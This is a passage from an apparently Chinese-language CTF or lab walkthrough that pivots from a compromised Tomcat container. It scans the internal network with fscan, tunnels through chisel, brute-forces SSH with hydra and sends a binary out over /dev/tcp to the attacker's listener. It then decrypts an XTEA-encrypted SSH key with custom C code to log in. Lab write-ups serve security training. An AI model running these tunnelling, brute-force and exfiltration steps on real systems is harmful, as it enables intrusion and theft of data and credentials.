1 root     root          4096 May  9  2019 var\nbash-4.4# cd opt\ncd opt\nbash-4.4# ls -al\nls -al\ntotal 8\ndrwxr-xr-x    2 root     root          4096 May  9  2019 .\ndrwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..\nbash-4.4# cd /tmp\ncd /tmp\nbash-4.4# ls -al\nls -al\ntotal 100\ndrwxrwxrwt    1 root     root          4096 Jun 27 13:31 .\ndrwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..\ndrwxr-xr-x    2 root     root          4096 Jun 27 08:43 hsperfdata_root\n-rw-r--r--    1 root     root             0 Jun 27 13:32 pwned\ndrwxr-xr-x    2 root     root          4096 Jun 24 17:59 tomcat-docbase.1184201892696408606.8080\ndrwxr-xr-x    2 root     root          4096 Jun 25 04:22 tomcat-docbase.1444708250586714476.8080\ndrwxr-xr-x    2 root     root          4096 Jun 24 14:38 tomcat-docbase.5466919642506520929.8080\ndrwxr-xr-x    2 root     root          4096 Jun 24 18:13 tomcat-docbase.6588034938316929679.8080\ndrwxr-xr-x    2 root     root          4096 Jun 27 08:43 tomcat-docbase.699883670974254994.8080\ndrwxr-xr-x    2 root     root          4096 Jun 26 04:57 tomcat-docbase.8687037479377177339.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 18:13 tomcat.1173889505140841269.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 17:59 tomcat.2191246823431995243.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 04:20 tomcat.2206522805757712248.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 11:27 tomcat.2255613080791652553.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 14:38 tomcat.2290088976635049676.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 11:47 tomcat.2333411802980577705.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 11:53 tomcat.3414059050473581299.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 11:20 tomcat.3433760887049367368.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 11:16 tomcat.4536791080797062601.8080\ndrwxr-xr-x    3 root     root          4096 Jun 25 04:22 tomcat.4599709844284107747.8080\ndrwxr-xr-x    3 root     root          4096 Jun 26 04:57 tomcat.4727403897225654129.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 17:46 tomcat.4758342710251538026.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 14:15 tomcat.5029475494002581605.8080\ndrwxr-xr-x    3 root     root          4096 Jun 27 08:43 tomcat.5432948747653639166.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 17:04 tomcat.7049257322533493187.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 11:34 tomcat.8691988937146253402.8080\nls -al\ntotal 100\ndrwxrwxrwt    1 root     root          4096 Jun 27 13:31 .\ndrwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..\ndrwxr-xr-x    2 root     root          4096 Jun 27 08:43 hsperfdata_root\n-rw-r--r--    1 root     root             0 Jun 27 13:32 pwned\ndrwxr-xr-x    2 root     root          4096 Jun 24 17:59 tomcat-docbase.1184201892696408606.8080\ndrwxr-xr-x    2 root     root          4096 Jun 25 04:22 tomcat-docbase.1444708250586714476.8080\ndrwxr-xr-x    2 root     root          4096 Jun 24 14:38 tomcat-docbase.5466919642506520929.8080\ndrwxr-xr-x    2 root     root          4096 Jun 24 18:13 tomcat-docbase.6588034938316929679.8080\ndrwxr-xr-x    2 root     root          4096 Jun 27 08:43 tomcat-docbase.699883670974254994.8080\ndrwxr-xr-x    2 root     root          4096 Jun 26 04:57 tomcat-docbase.8687037479377177339.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 18:13 tomcat.1173889505140841269.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 17:59 tomcat.2191246823431995243.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 04:20 tomcat.2206522805757712248.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 11:27 tomcat.2255613080791652553.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 14:38 tomcat.2290088976635049676.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 11:47 tomcat.2333411802980577705.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 11:53 tomcat.3414059050473581299.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 11:20 tomcat.3433760887049367368.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 11:16 tomcat.4536791080797062601.8080\ndrwxr-xr-x    3 root     root          4096 Jun 25 04:22 tomcat.4599709844284107747.8080\ndrwxr-xr-x    3 root     root          4096 Jun 26 04:57 tomcat.4727403897225654129.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 17:46 tomcat.4758342710251538026.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 14:15 tomcat.5029475494002581605.8080\ndrwxr-xr-x    3 root     root          4096 Jun 27 08:43 tomcat.5432948747653639166.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 17:04 tomcat.7049257322533493187.8080\ndrwxr-xr-x    3 root     root          4096 Jun 24 11:34 tomcat.8691988937146253402.8080\nbash-4.4# cd hsperfdata_root\ncd hsperfdata_root\nbash-4.4# ls -al\nls -al\ntotal 40\ndrwxr-xr-x    2 root     root          4096 Jun 27 08:43 .\ndrwxrwxrwt    1 root     root          4096 Jun 27 13:31 ..\n-rw-------    1 root     root         32768 Jun 27 13:37 1\n```\n\nhsperfdata_root\u662fjava\u7684\u65e5\u5fd7\u6ca1\u5565\u8425\u517b\uff0c\u56e0\u4e3a\u6211\u4eec\u5c31\u662f\u901a\u8fc7\u8fd9\u4e2a\u8fdb\u6765\u7684\n\n```\nbash-4.4# ip a\nip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP \n    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff\n    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n```\n\n### 4.1 \u5185\u7f51\u63a2\u6d4b\n\n\u662f\u4e2adocker\uff0c\u62c9\u4e2afscan\u6765\u626b\u63cf\u7f51\u6bb5\n\nkali\u5f00\u670d\u52a1\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ python3 -m http.server 80                                                                                                                                  \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n\n```\n\n\u62c9\n\n```\nbash-4.4# cd /tmp\ncd /tmp\nbash-4.4# wget 192.168.205.128/fscan\nwget 192.168.205.128/fscan\nConnecting to 192.168.205.128 (192.168.205.128:80)\nfscan                100% |********************************| 6933k  0:00:00 ETA\n\nbash-4.4# chmod +x fscan\nchmod +x fscan\nbash-4.4# ./fscan -h 172.17.0.1/16\n./fscan -h 172.17.0.1/16\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n(icmp) Target 172.17.0.1      is alive\n(icmp) Target 172.17.0.2      is alive\n(icmp) Target 172.17.0.3      is alive\n[*] LiveTop 172.17.0.0/16    \u6bb5\u5b58\u6d3b\u6570\u91cf\u4e3a: 3\n[*] LiveTop 172.17.0.0/24    \u6bb5\u5b58\u6d3b\u6570\u91cf\u4e3a: 3\n[*] Icmp alive hosts len is: 3\n172.17.0.3:8080 open\n172.17.0.1:8080 open\n172.17.0.2:22 open\n172.17.0.2:80 open\n172.17.0.1:80 open\n172.17.0.1:22 open\n[*] alive ports len is: 6\nstart vulscan\n[*] WebTitle http://172.17.0.1         code:200 len:6048   title:Linux Terminal Simulator\n[*] WebTitle http://172.17.0.2         code:200 len:2808   title:\u66b4\u529b\u7834\u89e3\u6280\u672f\u8bb2\u89e3\n[*] WebTitle http://172.17.0.3:8080    code:302 len:0      title:None \u8df3\u8f6curl: http://172.17.0.3:8080/login.html\n[*] WebTitle http://172.17.0.1:8080    code:302 len:0      title:None \u8df3\u8f6curl: http://172.17.0.1:8080/login.html\n[*] WebTitle http://172.17.0.3:8080/login.html code:200 len:2377   title:\u7528\u6237\u767b\u5f55\n[*] WebTitle http://172.17.0.1:8080/login.html code:200 len:2377   title:\u7528\u6237\u767b\u5f55\n\u5df2\u5b8c\u6210 6/6\n[*] \u626b\u63cf\u7ed3\u675f,\u8017\u65f6: 9.823162079s\n```\n\n172.17.0.1 \u5bbf\u4e3b\u673a 80 8080 22\n\n172.17.0.2 80 22 docker2\n\n17.17.0.3 \u672c\u673a\n\n\u90a3\u5148\u770b\u770b.2\uff0c80\u662f\u5565\n\n```\nbash-4.4# curl 172.17.0.2\ncurl 172.17.0.2\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<!DOCTYPE html>\n<html lang='zh'>\n<head>\n  <meta charset='UTF-8'>\n  <title>\u66b4\u529b\u7834\u89e3\u6280\u672f\u8bb2\u89e3</title>\n  <style>\n    body {\n      font-family: 'Microsoft YaHei', sans-serif;\n      background: #f5f7fa;\n      color: #333;\n      margin: 0;\n      padding: 0;\n    }\n\n    header {\n      background-color: #2c3e50;\n      color: white;\n      padding: 20px;\n      text-align: center;\n    }\n\n    main {\n      max-width: 800px;\n      margin: 30px auto;\n      padding: 20px;\n      background: white;\n      box-shadow: 0 0 10px rgba(0,0,0,0.1);\n      border-radius: 8px;\n    }\n\n    h2 {\n      color: #2c3e50;\n      border-bottom: 2px solid #ecf0f1;\n      padding-bottom: 5px;\n    }\n\n    ul {\n      margin-left: 20px;\n    }\n\n    code {\n      background: #ecf0f1;\n      padding: 2px 5px;\n      border-radius: 4px;\n    }\n\n    footer {\n      text-align: center;\n      padding: 15px;\n      color: #888;\n      font-size: 14px;\n    }\n  </style>\n</head>\n<body>\n  <header>\n    <h1>\u66b4\u529b\u7834\u89e3\u6280\u672f\u8bb2\u89e3</h1>\n  </header>\n\n  <main>\n    <h2>\u4ec0\u4e48\u662f\u66b4\u529b\u7834\u89e3\uff1f</h2>\n    <p>\u66b4\u529b\u7834\u89e3\uff08Brute Force Attack\uff09\u662f\u4e00\u79cd\u7a77\u4e3e\u6cd5\u653b\u51fb\u65b9\u5f0f\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u5c1d\u8bd5\u6240\u6709\u53ef\u80fd\u7684\u5bc6\u7801\u7ec4\u5408\uff0c\u76f4\u5230\u627e\u5230\u6b63\u786e\u7684\u5bc6\u7801\u4e3a\u6b62\u3002</p>\n\n    <h2>\u5e38\u89c1\u7684\u66b4\u529b\u7834\u89e3\u7c7b\u578b</h2>\n    <ul>\n      <li><strong>\u7eaf\u66b4\u529b\u7834\u89e3</strong>\uff1a\u4ece <code>aaaa</code> \u5230 <code>zzzz</code> \u9010\u4e2a\u5c1d\u8bd5\u6240\u6709\u7ec4\u5408\u3002</li>\n      <li><strong>\u5b57\u5178\u653b\u51fb</strong>\uff1a\u4f7f\u7528\u9884\u8bbe\u7684\u5e38\u7528\u5bc6\u7801\u5217\u8868\u8fdb\u884c\u5c1d\u8bd5\u3002</li>\n      <li><strong>\u6df7\u5408\u653b\u51fb</strong>\uff1a\u7ed3\u5408\u5b57\u5178\u8bcd\u548c\u5e38\u89c1\u53d8\u5316\uff08\u5982\u6dfb\u52a0123\uff0c\u5927\u5c0f\u5199\u53d8\u6362\u7b49\uff09\u3002</li>\n    </ul>\n\n    <h2>\u66b4\u529b\u7834\u89e3\u7684\u7279\u70b9</h2>\n    <ul>\n      <li>\u4e0d\u4f9d\u8d56\u6f0f\u6d1e\uff0c\u4ec5\u4f9d\u9760\u5c1d\u8bd5\u3002</li>\n      <li>\u8017\u65f6\u9ad8\uff0c\u590d\u6742\u5ea6\u968f\u5bc6\u7801\u957f\u5ea6\u548c\u5b57\u7b26\u96c6\u5448\u6307\u6570\u589e\u957f\u3002</li>\n      <li>\u53ef\u4ee5\u88ab\u81ea\u52a8\u5316\u811a\u672c\u6267\u884c\uff08\u5982\u4f7f\u7528 Python\u3001Hydra\u3001John the Ripper \u7b49\uff09\u3002</li>\n    </ul>\n\n    <h2>\u9632\u5fa1\u66b4\u529b\u7834\u89e3\u7684\u65b9\u6cd5</h2>\n    <ul>\n      <li>\u8bbe\u7f6e<strong>\u8d26\u6237\u9501\u5b9a</strong>\u7b56\u7565\uff0c\u4f8b\u5982\u8fde\u7eed\u9519\u8bef5\u6b21\u540e\u9501\u5b9a\u3002</li>\n      <li>\u52a0\u5165<strong>\u9a8c\u8bc1\u7801</strong>\uff0c\u963b\u6b62\u81ea\u52a8\u5316\u811a\u672c\u3002</li>\n      <li>\u9650\u5236<strong>\u767b\u5f55\u901f\u7387</strong>\uff0c\u5982 5 \u5206\u949f\u5185\u6700\u591a\u5c1d\u8bd5 3 \u6b21\u3002</li>\n      <li>\u4f7f\u7528<strong>\u5f3a\u5bc6\u7801</strong>\uff08\u957f\u4e14\u590d\u6742\u7684\u5bc6\u7801\uff09\u3002</li>\n      <li>\u76d1\u63a7\u767b\u5f55\u884c\u4e3a\uff0c\u68c0\u6d4b\u5f02\u5e38\u767b\u5f55\u5c1d\u8bd5\u3002</li>\n    </ul>\n\n    <h2>\u5408\u6cd5\u7528\u9014\u4e0e\u8b66\u544a</h2>\n    <p>\u66b4\u529b\u7834\u89e3\u6280\u672f\u53ef\u4ee5\u7528\u4e8e\u6e17\u900f\u6d4b\u8bd5\u548c\u5b89\u5168\u5ba1\u8ba1\uff0c\u4f46\u5728\u672a\u7ecf\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\u5c5e\u4e8e\u8fdd\u6cd5\u884c\u4e3a\u3002\u8bf7\u52a1\u5fc5\u9075\u5b88\u76f8\u5173\u6cd5\u5f8b\u6cd5\u89c4\u3002</p>\n100  2808  100  2808    0     0  2742k      0 --:--:-- --:--:-- --:--:-- 2742k\n/main>\n  <!--500-worst-passwords-->\n  <footer>\n    &copy; 2025 \u7f51\u7edc\u5b89\u5168\u6559\u5b66\u9875\u9762 | \u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\n  </footer>\n</body>\n</html>\n```\n\n\u544a\u8bc9\u6211\u4eec\u66b4\u529b\u7834\u89e3\uff0c\u5e76\u4e14\u7ed9\u4e86\u5b57\u5178500-worst-passwords\n\n\u7f51\u4e0a\u6252\u62c9\u4e86\u4e00\u4e0b\n\nhttps://gist.github.com/djaiss/4033452\n\n\u4e0b\u8f7d\u4e0b\u6765\uff0c\u7136\u540e\u6252\u62c9\u4e00\u4e2achisel\u8fc7\u6765\n\n### 4.2 \u5185\u7f51\u7a7f\u900f\u4e0eSSH\u7206\u7834\n\n```\nbash-4.4# wget 192.168.205.128/chisel\nwget 192.168.205.128/chisel\nConnecting to 192.168.205.128 (192.168.205.128:80)\nchisel               100% |********************************| 9152k  0:00:00 ETA\n\nbash-4.4# chmod +x chisel\nchmod +x chisel\n```\n\nkali\u5f00\u4e2a\u76d1\u542c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ./chisel server -p 8081 --reverse\n2025/06/27 20:52:53 server: Reverse tunnelling enabled\n2025/06/27 20:52:53 server: Fingerprint noxPhEnuZCIYVPVU9OBwffbD6OdVDKc9jcSAUtCtbN0=\n2025/06/27 20:52:53 server: Listening on http://0.0.0.0:8081\n```\n\n\u7136\u540e\u9776\u673adocker\n\n```\nbash-4.4# ./chisel client 192.168.205.128:8081 R:socks\n./chisel client 192.168.205.128:8081 R:socks\n2025/06/27 13:51:26 client: Connecting to ws://192.168.205.128:8081\n2025/06/27 13:51:26 client: Connected (Latency 698.603\u00b5s)\n```\n\n\u8fde\u4e0a\u4e86\uff0c\u7136\u540e\u4ed6\u9ed8\u8ba4\u662f\u4f7f\u7528socks5\u4ee3\u7406socks5 127.0.0.1 1080 \uff0c\u4f7f\u7528\u4ee3\u7406\u5de5\u5177\u52a0\u4e0a\u5c31\u597d\u4e86\n\n\u6211\u8fd9\u4f7f\u7528proxychains\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo vim /etc/proxychains4.conf\n[sudo] kali \u7684\u5bc6\u7801\uff1a\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ proxychains -q ssh root@172.17.0.2                                                                 \nThe authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.\nED25519 key fingerprint is SHA256:nCuJTguX/ssJuWNmjLBVoZlUUv1Ygi4k0AFEgPORK5M.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:1: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.\nroot@172.17.0.2's password: \nPermission denied, please try again.\nroot@172.17.0.2's password: \n\n```\n\nhydra\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ proxychains -q hydra -l root -P 500.txt ssh://172.17.0.2 -I -u -f -e nsr -t 64\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-27 21:07:52\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 64 tasks per 1 server, overall 64 tasks, 503 login tries (l:1/p:503), ~8 tries per task\n[DATA] attacking ssh://172.17.0.2:22/\n[22][ssh] host: 172.17.0.2   login: root   password: mountain\n[STATUS] attack finished for 172.17.0.2 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-27 21:07:53\n                                  \n```\n\n\u7ee7\u7eed\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ proxychains -q ssh root@172.17.0.2                                            \nroot@172.17.0.2's password: \nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides and general\ninformation about administrating Alpine systems.\nSee <https://wiki.alpinelinux.org/>.\n\nYou can setup the system with the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\n6ab28be27b0c:~# ls -al\ntotal 12\ndrwx------    1 root     root          4096 Jun 26 05:03 .\ndrwxr-xr-x    1 root     root          4096 Jun 24 17:57 ..\n-rw-------    1 root     root            79 Jun 27 14:12 .ash_history\n6ab28be27b0c:~# id\nuid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n6ab28be27b0c:~# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP \n    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff\n    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n\n```\n\n\u540e\u9762\u8fd9\u91cc\u6252\u62c9\u4e86\u5f88\u4e45\uff0c\u6211\u90fd\u6ca1\u770b\u5230\uff0c\u751a\u81f3\u4e8e\u6211\u90fd\u53bb\u6253\u5185\u6838\u6f0f\u6d1e\u4e86.....\n\n\u5b9e\u5728\u9876\u4e0d\u4f4f\u4e86\u60f3\u53bb\u95ee\u4f5c\u8005\uff0c\u4f5c\u8005\u5e94\u8be5\u662f\u90a3\u65f6\u5019\u6709\u4e8b\uff0c\u7136\u540e\u6211\u5c31\u60f3\u5230Sublarge\u5e94\u8be5\u662f\u6d4b\u8fc7\u7684\uff0c\u6240\u4ee5\u6211\u5c31\u76f4\u63a5\u53bb\u95ee\u4ed6\u4e86\n\nSublarge\u8bf4\u662f/usr/bin\u6709\u4e00\u4e2auserLogin\n\n```\n6ab28be27b0c:~# ls -la /usr/bin/userLogin \n-rwxr-xr-x    1 root     root        772016 Jun 24 13:15 /usr/bin/userLogin\n```\n\n## \u4e94\u3001\u63d0\u6743\u4e4b\u8def\uff1a\u89e3\u5bc6\u5bc6\u94a5\u4e0e\u6700\u7ec8ROOT\n\n\u786e\u5b9e\u6709\uff0c\u7136\u540e\u6211\u5c31\u60f3\u6d4b\u4e00\u4e0b\u4ed6\u7684\u529f\u80fd\n\n```\n6ab28be27b0c:~# /usr/bin/userLogin\nerror: No such file or directory\n6ab28be27b0c:~# /usr/bin/userLogin -h\nerror: No such file or directory\n6ab28be27b0c:~# /usr/bin/userLogin --help\nerror: No such file or directory\n```\n\n\u6ca1\u6709\u6709\u4ef7\u503c\u7684\uff0c\u90a3\u6211\u5c31\u60f3\u62c9\u8fc7\u53bb\u7ed9kali\n\nkali\u76d1\u542c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 1234 > userLogin\nlistening on [any] 1234 ...\n```\n\ndocker2\u53d1\u9001\n\n```\n6ab28be27b0c:~# cat /usr/bin/userLogin > /dev/tcp/192.168.205.128/1234\n-sh: can't create /dev/tcp/192.168.205.128/1234: nonexistent directory\n```\n\n\u4e0d\u884c\uff0c\u7784\u773cshell\n\n```\n6ab28be27b0c:~# echo $0\n-sh\n6ab28be27b0c:~# which bash\n/bin/bash\n6ab28be27b0c:~# /bin/bash\n6ab28be27b0c:~# echo $0\n/bin/bash\n6ab28be27b0c:~# cat /usr/bin/userLogin > /dev/tcp/192.168.205.128/1234\n```\n\n\u884c\u4e86\uff0c\u62d6\u53bbida\n\n### 5.1 \u4e8c\u8fdb\u5236\u9006\u5411\u4e0eXTEA\u89e3\u5bc6\n\n\u968f\u4fbf\u6252\u62c9\u4e86\u4e00\u4e0b\uff0c\u662f\u4e00\u4e2a\u52a0\u5bc6\u7a0b\u5e8f\n\n\u4f7f\u7528xtea\u52a0\u5bc6\uff0c\u8f93\u5165\u6587\u4ef6\u662fid_ed25519\uff0c\u8f93\u51faoutput.enc\n\n\u8fd9\u91cc\u8d39\u4e86\u8001\u5927\u52b2\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/jiemi]\n\u2514\u2500$ vim a.c     \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/jiemi]\n\u2514\u2500$ cat a.c      \n#include <stdio.h>\n#include <stdint.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define ENCRYPTED_FILE 'output.enc'\n#define DECRYPTED_FILE 'decrypted_file'\n\nconst char FIXED_KEY_STR[] = 'key-for-user-ldzid_ed25519';\n\nvoid gen_key(uint32_t *k) {\n    const unsigned char *s = (const unsigned char *)FIXED_KEY_STR;\n    for (int i = 0; i < 4; ++i) {\n        k[i] = (uint32_t)s[4*i+2] << 16 |\n               (uint32_t)s[4*i+1] << 8  |\n               (uint32_t)s[4*i]        |\n               (uint32_t)s[4*i+3] << 24;\n    }\n}\n\nvoid xtea_decrypt(uint32_t *v, const uint32_t *k) {\n    uint32_t v0 = v[0], v1 = v[1];\n    const uint32_t delta = 0x9E3779B9;\n    const int n_rounds = 64;\n    uint32_t sum = delta * n_rounds;\n\n    for (int i = 0; i < n_rounds; ++i) {\n        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum >> 11) & 3]);\n        sum -= delta;\n        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum & 3]);\n    }\n\n    v[0] = v0;\n    v[1] = v1;\n}\n\nint main() {\n    FILE *fin, *fout;\n    uint32_t key[4];\n    uint64_t block;\n    size_t br;\n\n    printf('\u5f00\u59cb\u89e3\u5bc6...\\n');\n    printf('\u8f93\u5165\u6587\u4ef6\uff08\u52a0\u5bc6\uff09: %s\\n', ENCRYPTED_FILE);\n    printf('\u8f93\u51fa\u6587\u4ef6\uff08\u89e3\u5bc6\uff09: %s\\n', DECRYPTED_FILE);\n\n    fin = fopen(ENCRYPTED_FILE, 'rb');\n    if (!fin) {\n        perror('\u65e0\u6cd5\u6253\u5f00\u52a0\u5bc6\u6587\u4ef6');\n        return 1;\n    }\n\n    fout = fopen(DECRYPTED_FILE, 'wb');\n    if (!fout) {\n        perror('\u65e0\u6cd5\u521b\u5efa\u8f93\u51fa\u6587\u4ef6');\n        fclose(fin);\n        return 1;\n    }\n\n    gen_key(key);\n\n    while ((br = fread(&block, 1, 8, fin)) > 0) {\n        if (br != 8) {\n            printf('\\n\u8b66\u544a\uff1a\u8bfb\u53d6\u5230\u4e0d\u5b8c\u6574\u7684\u6570\u636e\u5757 (%zu \u5b57\u8282)\uff0c\u6587\u4ef6\u53ef\u80fd\u5df2\u635f\u574f\u3002\\n', br);\n        }\n\n        xtea_decrypt((uint32_t *)&block, key);\n        fwrite(&block, 1, 8, fout);\n    }\n\n    fclose(fin);\n    fclose(fout);\n\n    printf('\\n\u89e3\u5bc6\u5b8c\u6210\u3002\\n');\n    printf('\u6ce8\u610f\uff1a\u539f\u59cb\u6587\u4ef6\u53ef\u80fd\u88ab\u586b\u5145\u4e86\u96f6\u5b57\u8282\u4ee5\u5bf9\u9f50 8 \u5b57\u8282\u8fb9\u754c\uff0c\u56e0\u6b64\u8f93\u51fa\u6587\u4ef6\u672b\u5c3e\u53ef\u80fd\u4f1a\u6709\u591a\u4f59\u7684\u7a7a\u5b57\u8282\u3002\\n');\n\n    return 0;\n}\n       \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/jiemi]\n\u2514\u2500$ gcc a.c -o a                  \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/jiemi]\n\u2514\u2500$ ./a      \n\u5f00\u59cb\u89e3\u5bc6...\n\u8f93\u5165\u6587\u4ef6\uff08\u52a0\u5bc6\uff09: output.enc\n\u8f93\u51fa\u6587\u4ef6\uff08\u89e3\u5bc6\uff09: decrypted_file\n\n\u89e3\u5bc6\u5b8c\u6210\u3002\n\u6ce8\u610f\uff1a\u539f\u59cb\u6587\u4ef6\u53ef\u80fd\u88ab\u586b\u5145\u4e86\u96f6\u5b57\u8282\u4ee5\u5bf9\u9f50 8 \u5b57\u8282\u8fb9\u754c\uff0c\u56e0\u6b64\u8f93\u51fa\u6587\u4ef6\u672b\u5c3e\u53ef\u80fd\u4f1a\u6709\u591a\u4f59\u7684\u7a7a\u5b57\u8282\u3002\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/jiemi]\n\u2514\u2500$ file decrypted_file\ndecrypted_file: OpenSSH private key\n                             \n```\n\n### 5.2 \u666e\u901a\u7528\u6237\u6743\u9650\u83b7\u53d6\n\n\u56e0\u4e3a\u6211\u8fd9kali\u90e8\u7f72\u95ee\u9898\uff0c\u6240\u4ee5\u8981\u62c9\u53bb/tmp\u8fde\u63a5\uff0c\u4f60\u7684\u5e94\u8be5\u4e0d\u7528\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/jiemi]\n\u2514\u2500$ cp decrypted_file /tmp/id_rsa\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/jiemi]\n\u2514\u2500$ cd /tmp                      \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ ls -al id_rsa    \n-rwxr-xr-x 1 kali kali 400  6\u670827\u65e5 21:31 id_rsa\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ chmod 600 id_rsa\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ ls -al id_rsa   \n-rw------- 1 kali kali 400  6\u670827\u65e5 21:31 id_rsa\n            \n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ ssh ldz@192.168.205.131 -i /tmp/id_rsa     \nThe authenticity of host '192.168.205.131 (192.168.205.131)' can't be established.\nED25519 key fingerprint is SHA256:B9Pod6bX/35WGX2264fO3mYHE9TOsUwS6RGy8ZAswug.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:4: [hashed name]\n    ~/.ssh/known_hosts:5: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.131' (ED25519) to the list of known hosts.\n\nlocalhost:~$ id\nuid=1000(ldz) gid=1000(ldz) 